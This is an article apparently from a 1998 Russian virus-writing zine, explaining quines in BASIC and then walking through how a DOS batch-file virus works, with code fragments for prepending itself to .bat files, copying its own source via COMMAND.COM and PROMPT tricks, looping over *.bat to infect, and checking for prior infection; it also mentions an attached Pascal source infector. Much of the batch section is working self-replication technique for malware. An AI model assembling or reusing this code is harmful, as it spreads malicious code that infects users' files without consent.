▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓▓▓┌──────────────────────────────────────────────────────────────────────┐▓▓▓▓
▓▓▓│                                       ▄ ▄                            │░░▓▓
▓▓▓│ ▄██▄ ▄██▄  █ █  ▄▀▀▄ █  █ █  █ █▐▌█  ▄▄█▄▄ ▄██▄ █▀▀▄ █ █ █ ▄▀▀█ ▄▀▀█ │░░▓▓
▓▓▓│ ▄▄▄█ █▄▄▄ █ █ █ █    █  █ █  █ █  █  █ █ █ █▄▄▄ █  █ █ █ █ █  █ █  █ │░░▓▓
▓▓▓│ ▄▄▄█ █▄▄▄ █ █ █ █  ▄ █▄▀  █  █ █  █  █▄█▄█ █▄▄▄ █▀▀  ▀▄▀▄▀ █▄▄█ █  █ │░░▓▓
▓▓▓│  ▀▀   ▀▀  ▀ ▀ ▀  ▀▀  ▀ ▀▀  ▀▀▀  ▀▀▀    ▀    ▀▀  ▀     ▀ ▀  ▀  ▀ ▀  ▀ │░░▓▓
▓▓▓├──────────────────────────────────────────────────────────────────────┤░░▓▓
▓▓▓│                            В ы п у с к ∙3∙                           │░░▓▓
▓▓▓└──────────────────────────────────────────────────────────────────────┘░░▓▓
▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

                            Г Л Ю К О М О Р Ь Е


                                        в сией статье накорябано много умных 
                                   слов: чтоб запутать иностранцев и сбить с 
                                                             толку остальных.
                                   потому прошу прощения, если кто-то найдет 
                                                     такие слова неуместными.


							вирус - что девка:
							подцепить их - не штука,
							отделаться - труд.
								Sassa-san <-)



недавно в конференции поднимался вопрос о создании вируса, поражающего 
исходники. идея не нова, обсуждатели новые. 


то есть, стоит задача примерно такого плана ,) : 

построить отображение Alg такое, что существует Text, для которого выполняется

Compiler( Text ) -> Alg
Alg( t ) -> Text

компилятор отображает текст в пространство алгоритмов ;), а алгоритм отображает
время в тот самый текст.


                        -= абсурдность идеи вируса =-

вирус, как злобное проявление человеческой натуры, направлен на быстрое и 
незаметное распространение. сырцовик же не способен на такое:

  - программеров на три (если не больше!) порядка меньше, чем юзырей - 
      среда обитания такого вируса весьма ограничена
  - программеры не обмениваются сырцами - среда обитания замкнута
  - если они все-таки обменялись сырцами - программер пытается сначала осознать,
      что эта программа должна делать, а уж потом запустит. это происходит не
      из-за подозрения, а из любопытства.
  - до компиляции легко обнаружить code corrupt - среда обитания лишена 
      privacy, процесс размножения проходит на глазах опытного в таких делах
      человека ( как, однако, все можно понять! #-) 

потому такой вир не сможет распространяться самостоятельно, точнее, без ведома 
хозяина. во всяком случае, последствия хорошо заметны и легко устранимы. 
но тем не менее это вирус, как проявление разумной части человеческой натуры, и
этим он представляет интерес, хотя бы и как лабораторный экземпляр.


                           -= сложность задачи =-

 - рекурсивный рост исходников.
обычно для вывода чего-нибудь куда-нибудь записывается вызов процедуры или 
команда языка. процедура выводит все сырцы. но теперь нужно вывести и сам вызов
процедуры:
a=1             ; сырцы
PRINT "a=1"	; процедура, их выводящая
PRINT "PRINT "a=1"" ; процедура, выводящая процедуру, выводящую сырцы
...

 - вывод непечатаемых символов.
к таким можно причислить разделители строк, символы перехода на новую строку, 
и прочие. например, в предыдущем примере строка

PRINT "PRINT "a=1"" 

будет безжалостно обругана Бейсиком


		      -= предлагаемое направление решения =-

 - научиться выводить исходники хотя бы без непечатаемых символов
 - научиться преобразовывать исходники с непечатаемыми символами в исходники с 
вполне печатаемыми символами


обычно языки позволяют определять текстовые переменные.
поразмыслив немного, легко видеть, что в этом случае задача разбивается на три 
шага:
- вывод исходников до места, в котором определяется текстовая переменная "сырцы";
- вывод определения этой переменной (алгоритмическое преобразование текста 
с непечатаемыми символами); 
- вывод исходников до конца программы - ничем не отличается от первого шага.

при этом, если переменная "сырцы" разбита на несколько строк,
то эти строки должны быть одинаковыми по структуре (для преобразования 
алгоритмически выгодным нам кажется цикл). 


вот одно из возможных решений на Бейсике. (пожалуй, самое короткое, которое 
нам доводилось видеть. кто хочет - пусть попытается побить этот рекорд. мы 
готовы обсудить любые решения, на любом языке)

a$=":print chr$(97)+chr$(38)+chr$(61)+chr$(34)+a$+chr$(34)+a$":print chr$(97)+chr$(38)+chr$(61)+chr$(34)+a$+chr$(34)+a$

но это не чистая победа. она сродни выводу шестнадцатиричного дампа вместо 
ассемблерных инструкций.

Тем не менее, этому решению присущи все этапы вывода исходников, которые мы 
предлагали: 

print a$  -- это мы научились выводить исходники без непечатных символов. 
             нужно только присвоить переменнной a$ соответствующее значение.

a$=":print a$":print "a$="+a$+":"+a$ -- это вывод "исходников" в нормальном виде

print "a" -> print chr$(97)+chr$(38)+chr$(97) -- это алгоритмическое 
             преобразование непечатаемых символов к "печатаемому" виду: функция
             chr$(x) -- отображение пространства чисел в пространство 
                     ASCII-символов ;)

вот это интереснее:

a$( 3 ) = "a$( 1 ) = "
a$( 1 ) = "a$("
a$( 4 ) = "a$( 2 ) = "
a$( 2 ) = ") ="
a$( 5 ) = "FOR i = 3 TO 10"
FOR i = 3 TO 10
a$( 6 ) = "  PRINT a$( 1 ); i; a$( 2 );"
  PRINT a$( 1 ); i; a$( 2 );
a$( 7 ) = "  WRITE a$( i )"
  WRITE a$( i )
a$( 8 ) = "  PRINT a$( i );"
  PRINT a$( i );
a$( 9 ) = "  IF i <= 4 THEN WRITE a$(i - 2) ELSE PRINT"
  IF i <= 4 THEN WRITE a$(i - 2) ELSE PRINT
a$( 10 ) = "NEXT"
NEXT

Бейсик интересен тем, что сам предоставляет средства для вывода непечатаемых
симоволов: write "a" напечатает: 
"a"


                                -= экстремали =-

вашему вниманию предлагается бат-вирус: вирус, поражающий bat-файлы операционной
системы M$-D0$. его тело прилагается в файле KTULU.BAT
ниже приводится описание алгоритма вывода текста исходников в файл, 
использованный в этом вирусе.

короче:
пришиваемся в начало батника, работаем, отдаем управление старому батнику

нам нужна память для переменных окружения (нам придется их модифицировать 
и вводить свои): нужно попросить у COMMAND.COM.
просим его запустить меня же, но с выделенной памятью:

COMMAND.COM /E:10000 /C %0 Memory_allocated

тут:
/E:10000 - нижайшая просьба выделить окружение в 10К.
/C - выполнить файл с параметрами
%0 - подставить имя батника 
Memory_allocated - ключик, по которому вир узнает, что память выделена.

потому в начале вира пишется "мультиплексор" - разводила по процедурам.
я прошу батник выполнить соотв процедуру - запускаю его с именем процедуры, 
и он ее выполняет:

if _%1==_Memory_allocated goto MAlloc 

%1 - первый параметр строки
_%1 - хитрость, чтобы если параметр не передан (первый запуск), то чтобы 
     ДОС не ругался, что if ==Memory_allocated .. - сравнение пустой строки.
     мне не трудно добавить в сравниваемой строке спереди "_"

тэкс... память выделили. подготовка закончилась. выделим тело вируса в отдельный
файл, чтобы потом легко втыкать его в начало любого батника.

в общем, это делается так:

echo if _%1==_Memory_allocated goto MAlloc>>tmp.bat

но теперь нужно вывести еще и "echo if ...>>tmp.bat"
а это решаем так: все равно эта надпись появится на экране (command.com 
протоколирует выполнение бат-файлов на экран) - потому перенаправим
вывод с экрана в файл, предварительно установим PROMPT="":

set RPOMPT=$a           ; это чтобы явно видно, что не пробел, а пустая строка
			; если написать set PROMPT=
			; то command.com будет подставлять <текущий диск>'>'
COMMAND.COM /C %0 Write_to_File >tmp2.bat

теперь у нас в TMP.BAT будет первая часть файла (echo выводит все туда), 
а в TMP2.BAT -- та его часть, которая выводит первую ;))))))(command.com пишет 
протокол туда). 

сшить их в кучу можно многими способами. например, так:

type TMP2.BAT>>TMP.BAT

тэкс... осталось придумать, как вывести в файл команду
COMMAND.COM /C %0 Write_to_File >tmp2.bat

хе, ведь я же говорил: 
echo COMMAND.COM /C %0 Write_to_File >tmp2.bat >>tmp.bat

ээ... ммм... и куда же это уйдет? и что же ваще пойдет?
проблема непечатаемых символов: '>' (и '%'!)

делаем хитрее:

@set PROMPT=COMMAND.COM /C %0 Write_to_File $gtmp2.bat
;
теперь во время выполнения второй "команды" (';') в файл TMP2.BAT (куда
перенаправлен экран) вывалится строка 
COMMAND.COM /C %0 Write_to_File >tmp2.bat;

(алгоритмическое преобразование '>' в печатаемый вид: '$g')
кто не верит, пусть проверит ;)
ну тут еще проблемка, как вывести %

если я поставлю один процент, он не выведется.
а если два - то в TMP2.BAT (в протокол) уйдет тоже только один (а надо два!)

мда...
усложняем код до такого:
вместо просто 
echo if _%1==_Memory_allocated goto MAlloc>>tmp.bat

пишем
echo @echo if _%prc%1==_Memory_allocated goto MAlloc>>tmp.bat

и вызываем себя, как и первый раз.
но теперь в TMP.BAT -- не сам исходник, а прога, его выводящая.
стоит просто написать
set prc=%%

и вызвать 
COMMAND.COM /C TMP.BAT >>TMP3.BAT

теперь в TMP3.BAT -- исходники до места вывода их в файл.

теперь чиним так (!):
set prc=%prc%prc%prc%

хихикс! теперь
echo %prc%
выведет на экран

%prc%

уловили? ;)
set prc=%%
echo if _%prc%1==_Memory_allocated goto MAlloc>>tmp.bat
выведет

if _%1==_Memory_allocated goto MAlloc

теперь 
set prc=%prc%prc%prc%
echo @echo if _%prc%1==_Memory_allocated goto MAlloc>>tmp.bat
выведет

@echo if _%prc%1==_Memory_allocated goto MAlloc

и в протоколе будет записано именно эта строка исходников!
echo @echo if _%prc%1==_Memory_allocated goto MAlloc>>tmp.bat

...

значицца, 
set prc=%%
set prc=%prc%prc%prc%
COMMAND.COM /C %0 Write_to_File >tmp2.bat
set prc=%%
COMMAND.COM /C TMP.BAT >TMP3.BAT 

вуаля!

как перезаражать всех? это не интересно...

есть такая штука:
for %%i in (*.bat) do ...

теперь в цикле переменной %i последовательно будут переданы имена файлов 
*.bat текущего каталога.



как определить, заражен ли файл?
grep ...
или find ...

но это нестандартные команды...

дотачаем спереди goto label
если label в файле нету, то выполнение прервется.
если label в файле есть, то произойдет переход на нее.
потому вставим в вир эту метку, которая даст знать наружу, что 
переход БЫЛ!

кстати, в случае, если незараженный файл найден, в stderr command.com 
выдаст сообщение "Label not found". вот это можно без ущерба вписать как злобное
действие ;) 

кто научится избавляться от этого или придумает иной способ 
определения зараженности - просьба поделиться знаниями с нами.
вообще, мы весьма ценим любые новые мысли по этому поводу.


основные части вира пояснил.

теперь, оказывается, если 

echo hihix
echo gygy

то в файл протокола (TMP2.BAT) будет записано 
echo hihix

echo gygy

(здесь: 
#define hihix h>>file1
#define gygy h1>>file1
если без перенаправления, то попадет тоже в файл протокола)

а значит, вир от клона к клону будет расти. Это можно вписать ему как злобное
действие, но для чистоты эксперимента (мы ведь пишем не вир, а прогу, выводящую
свои сырцы! ;) избавимся от этого, если возможно. а то получаем не "прогу, 
выводящую сырцы", а "прогу, выводящую _идентичные_по_действию_ сырцы".

оказывается, возможно:

echo hihix
@
echo gygy

в файле протокола будет записано, как
echo hihix
echo gygy
что мы и хотели. но ведь теперь нужно писать не это, а 

echo hihix
@
echo gygy

ну, эта задачка - раз плюнуть:
echo hihix
@
@call spacer.bat
@
echo gygy

[spacer.bat]
@echo @
@echo @call spacer.bat
@echo @

но опять появляются пустые строки (это была выполнена последняя 
команда spacer.bat - "пустая строка", которая всегда будет появляться, если 
файл генерируется с помощью echo, а не руками; а ведь все необходимые для жизни
"функции" вир должен implement самостоятельно). 
потому вызываем через command.com
echo hihix
@
@command /C spacer.bat
@
echo gygy

[spacer.bat]
@echo @
@echo @command.com /C spacer.bat
@echo @
@exit

вот теперь - другое дело.


--
если читатель разобрался в бат-вирусе - то, я думаю, в MYSELF.ASM и 3apa3a.pas 
разобраться - пара пустяков.  

MYSELF.ASM не прилагается, но прилагается прога, его генерящая: MYSELF.COM
   это заберет время - около 20 секунд. хотя, если буферизирована запись, то 
   все ок. лень было писать вывод в файл
   большими блоками; вывод в файл происходит чуть ли не побайтно ;)

3apa3a.pas -- прога, поражающая pas-исходники. основное занятие все то же:
   вывод исходников в файл.

(c:) 1998, Sassa, Apiary Inc.
  _____
@()(_)
/\\
mailto: 
 wow@shcherback.sumy.ua
 sassa@shcherback.sumy.ua
